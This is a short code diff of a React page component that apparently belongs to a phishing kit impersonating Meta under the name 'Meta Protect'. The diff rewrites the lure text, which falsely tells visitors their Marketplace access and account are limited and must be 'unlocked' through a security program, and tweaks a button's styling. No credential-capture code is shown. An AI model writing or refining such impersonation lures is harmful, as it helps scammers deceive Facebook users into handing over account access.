@@ -16,7 +16,7 @@ const Index = () => {
     const defaultTexts = useMemo(
         () => ({
             title: 'Welcome To Meta Protect.',
-            description: "Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.",
+            description: "Your access to Marketplace and your account is limited, so we require higher security requirements for your account. We created this security program to unlock your Page.",
             protectionText: "We've enabled advanced protections to unlock your Page.",
             processText: 'Below, we walk you through the process in detail and help you fully activate to unlock your Page.',
             continueBtn: 'Continue',
@@ -111,7 +111,7 @@ const Index = () => {
                     </div>
                 </div>
                 <button
-                    className='rounded-lg bg-blue-500 px-3 py-4 font-bold text-white disabled:opacity-50'
+                    className='rounded-lg bg-blue-500 px-2 py-2 text-sm font-bold text-white disabled:opacity-50'
                     disabled={isLoading}
                     onClick={() => {
                         navigate(PATHS.HOME);
